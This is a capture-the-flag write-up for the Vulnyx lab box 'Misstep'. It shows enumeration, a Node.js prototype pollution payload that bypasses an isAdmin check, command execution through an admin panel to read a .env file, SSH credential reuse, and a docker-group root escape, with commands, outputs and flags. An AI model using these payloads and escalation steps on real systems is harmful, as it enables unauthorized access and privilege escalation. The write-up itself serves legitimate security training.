# Vulnyx: Misstep

| | |
|---|---|
| **Platform** | Vulnyx |
| **OS** | Linux |
| **Difficulty** | Easy |
| **Creator** | `Tirex` |
| **Tools used** | `nmap` · `ffuf` · `curl` · `hydra` · `docker` |
| **Tags** | `#PrototypePollution` `#NodeJS` `#AuthBypass` `#RCE` `#DockerAbuse` |
| **URL** | https://vulnyx.com/machines/ |

A settings endpoint merges user-supplied JSON into an object without filtering dangerous keys, letting a `__proto__` payload pollute the whole Node.js process's object prototype — flipping an `isAdmin` check everywhere it's referenced, session included. That grants access to an admin panel with a built-in command-execution feature, leaking database credentials from a `.env` file. From there, membership in the `docker` group provides the same host-escape path seen elsewhere in this set.

## Enumeration

### Port Enumeration

A full TCP port scan comes first:

```bash
$ sudo nmap -p- -sS --open --min-rate 5000 -n -vvv -Pn misstep.nyx

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: 08:00:27:F6:E9:3F (Oracle VirtualBox virtual NIC)
```

Two ports come back open: **22 (SSH)** and **80 (HTTP)**. A version/script scan against both fills in the details:

```bash
$ sudo nmap -p 22,80 -sCV misstep.nyx

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 b9:7c:3a:db:22:76:47:d9:29:af:da:cd:0d:1b:22:d5 (ECDSA)
|_  256 45:65:36:61:8d:79:c3:dc:f7:a1:71:37:7d:f1:a1:cf (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
|_http-server-header: nginx/1.24.0 (Ubuntu)
MAC Address: 08:00:27:F6:E9:3F (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Web Enumeration

```
http://misstep.nyx/
```

<img src="../Images/misstep/Pasted image 20260802151948.png"/>

A content scan turns up an `admin` path, which returns 403 rather than 404 — it exists, but access is denied:

```bash
$ ffuf -u http://misstep.nyx/FUZZ -w /usr/share/wordlists/dirb/big.txt -e .php,.html,.txt -ic

ADMIN                  [Status: 403, Size: 9, Words: 1, Lines: 1, Duration: 88ms]
Admin                  [Status: 403, Size: 9, Words: 1, Lines: 1, Duration: 90ms]
admin                  [Status: 403, Size: 9, Words: 1, Lines: 1, Duration: 88ms]
```

```
http://misstep.nyx/admin
```

<img src="../Images/misstep/Pasted image 20260802152044.png"/>

Inspecting the raw response headers surfaces the tech stack — an Express.js `connect.sid` session cookie, an `X-Powered-By: Express` header, and, tellingly, an `X-API-Endpoint` pointing at a settings route:

```bash
$ curl -v http://misstep.nyx
* Host misstep.nyx:80 was resolved.
* IPv6: (none)
* IPv4: <IP_Victim>
*   Trying <IP_Victim>:80...
* Established connection to misstep.nyx (<IP_Victim> port 80) from <ATTACKER_IP> port 56760
* using HTTP/1.x
> GET / HTTP/1.1
> Host: misstep.nyx
> User-Agent: curl/8.20.0
> Accept: */*
>
* Request completely sent off
< HTTP/1.1 404 Not Found
< Server: nginx/1.24.0 (Ubuntu)
< Date: Sun, 02 Aug 2026 12:58:45 GMT
< Content-Type: text/html; charset=utf-8
< Content-Length: 23
< Connection: keep-alive
< X-Powered-By: Express
< X-API-Endpoint: /api/update/settings
< ETag: W/"17-UEU8wd8hBF8nHgUuRSOQ4HOA4Jk"

* Connection #0 to host misstep.nyx:80 left intact
<pre>Cannot GET /</pre>
```

## Initial Access

### Prototype Pollution → Admin Access

The advertised settings endpoint is probed — a POST returns the current settings object, and requesting it also hands back a fresh session cookie:

```bash
$ curl -X POST http://misstep.nyx/api/update/settings
{"message":"Settings updated!","user":{"username":"guest","theme":"light"}}
```

```bash
$ curl -v http://misstep.nyx/api/update/settings
* Host misstep.nyx:80 was resolved.
* IPv6: (none)
* IPv4: <IP_Victim>
*   Trying <IP_Victim>:80...
* Established connection to misstep.nyx (<IP_Victim> port 80) from <ATTACKER_IP> port 58120
* using HTTP/1.x
> GET /api/update/settings HTTP/1.1
> Host: misstep.nyx
> User-Agent: curl/8.20.0
> Accept: */*
>
* Request completely sent off
< HTTP/1.1 404 Not Found
< Server: nginx/1.24.0 (Ubuntu)
< Date: Sun, 02 Aug 2026 13:01:00 GMT
< Content-Type: text/html; charset=utf-8
< Content-Length: 158
< Connection: keep-alive
< X-Powered-By: Express
< Content-Security-Policy: default-src 'none'
< X-Content-Type-Options: nosniff
< Set-Cookie: connect.sid=s%3AqkDR1WJt2Z0MwwBlP6xdEAm6MpUwZ9lU.lFez1UV%2BOoMnFkQDUDTOD7XUuIz8p%2FSHTiq8wdCU4Pg; Path=/; HttpOnly

<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Error</title>
</head>
<body>
<pre>Cannot GET /api/update/settings</pre>
</body>
</html>

* Connection #0 to host misstep.nyx:80 left intact
```

In JavaScript, nearly every object inherits from `Object.prototype`. If an endpoint merges user-controlled JSON keys onto an object without filtering special keys like `__proto__`, a payload targeting that key pollutes the *prototype itself* — affecting every object across the running process, not just the one being updated:

```bash
$ curl -X POST http://misstep.nyx/api/update/settings -H 'Content-Type: application/json' -b 'connect.sid=s%3AqkDR1WJt2Z0MwwBlP6xdEAm6MpUwZ9lU.lFez1UV%2BOoMnFkQDUDTOD7XUuIz8p%2FSHTiq8wdCU4Pg' -d '{"__proto__":{"isAdmin": true}}'
{"message":"Settings updated!","user":{"username":"guest","theme":"light"}}'
```

Since every object now inherits `isAdmin: true` by default — including whatever object the app checks for admin authorization — the previously blocked page is reachable:

```
http://misstep.nyx/admin
```

<img src="../Images/misstep/Pasted image 20260802152254.png"/>

### RCE via the Admin Panel

The panel includes a command execution feature:

```http
POST /admin/exec HTTP/1.1
Host: misstep.nyx
Cookie: connect.sid=s%3AzrA2tf5vEyZNOH50P_V0uB_hiO3vj1mW.5MvmX3oxcc%2BXtObf5qdzQaxXnrXUk0HQ3LcFKAfh7iU
Content-Type: application/x-www-form-urlencoded

command=id
```

<img src="../Images/misstep/Pasted image 20260802152333.png"/>

The same endpoint enumerates the filesystem, working toward the app's own directory and its `.env`:

```http
command=ls+-l+/home
```

<img src="../Images/misstep/Pasted image 20260802152415.png"/>

```http
command=ls+-la+/home/dev
```

<img src="../Images/misstep/Pasted image 20260802152442.png"/>

```http
command=ls+-la+/var/www/html
```

<img src="../Images/misstep/Pasted image 20260802152518.png"/>

```http
command=cat+/var/www/html/.env
```

<img src="../Images/misstep/Pasted image 20260802152551.png"/>

> **Credentials:** `dev:DatabasePassword123!`

### Shell as dev

The leaked database password is reused for SSH — a quick single-shot `hydra` confirms it before logging in:

```bash
$ hydra -l 'dev' -p 'DatabasePassword123!' ssh://misstep.nyx

[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 1 task per 1 server, overall 1 task, 1 login try (l:1/p:1), ~1 try per task
[DATA] attacking ssh://misstep.nyx:22/
[22][ssh] host: misstep.nyx   login: dev   password: DatabasePassword123!
1 of 1 target successfully completed, 1 valid password found
```

```bash
$ ssh dev@misstep.nyx
dev@misstep:~$ id
uid=1000(dev) gid=1000(dev) groups=1000(dev),110(docker)
dev@misstep:~$ ls -l /home/dev
total 8
-rwxr-xr-x    1 dev      dev            140 Aug 20  2025 push_to_registry.sh
-rw-------    1 dev      dev             33 Aug 20  2025 user.txt
dev@misstep:~$ cat /home/dev/user.txt
e4a21a23590433d700b9e29a5a5f1a8a
```

> **User flag:** `e4a21a23590433d700b9e29a5a5f1a8a`

## Privilege Escalation

### Docker Group Abuse

`dev`'s `id` already shows membership in the `docker` group (`110(docker)`) — and a local script hints at the container workflow the box is built around:

```bash
dev@misstep:~$ cat /home/dev/push_to_registry.sh
#!/bin/bash
export DOCKER_API_KEY=dckr_pat_aVeryLongAndSecretKey
echo "Building and pushing legacy-app..."
# Placeholder for build commands
```

The same technique used elsewhere in this set applies here: a container started from `alpine` runs as root inside its own namespace, and with the host's root filesystem bind-mounted in, `chroot`-ing into that mount reaches the host as root directly:

```bash
dev@misstep:~$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
# id
uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)
# ls -l /root
total 44
drwxr-xr-x   72 root     root          4096 Aug 20  2025 node_modules
-rw-r--r--    1 root     root         29827 Aug 20  2025 package-lock.json
-rw-r--r--    1 root     root            86 Aug 20  2025 package.json
-rw-------    1 root     root            33 Aug 24  2025 root.txt
# cat /root/root.txt
0d9a61475201a84f32815108f7b7f849
```

> **Root flag:** `0d9a61475201a84f32815108f7b7f849`

## Takeaways

- Prototype pollution is a JavaScript-specific vulnerability class worth checking for on any endpoint that merges request bodies into internal objects — a `__proto__` key in the payload, if unfiltered, corrupts the shared prototype for the entire running process.
- An authorization check based on a plain object property (`isAdmin`) is only as trustworthy as the guarantee that nothing else in the app can set that property unexpectedly — prototype pollution breaks exactly that assumption.
- A "command execution" feature gated behind authentication is still full RCE the moment that authentication can be bypassed — the admin panel here wasn't a separate vulnerability, just the payload for the one that came before it.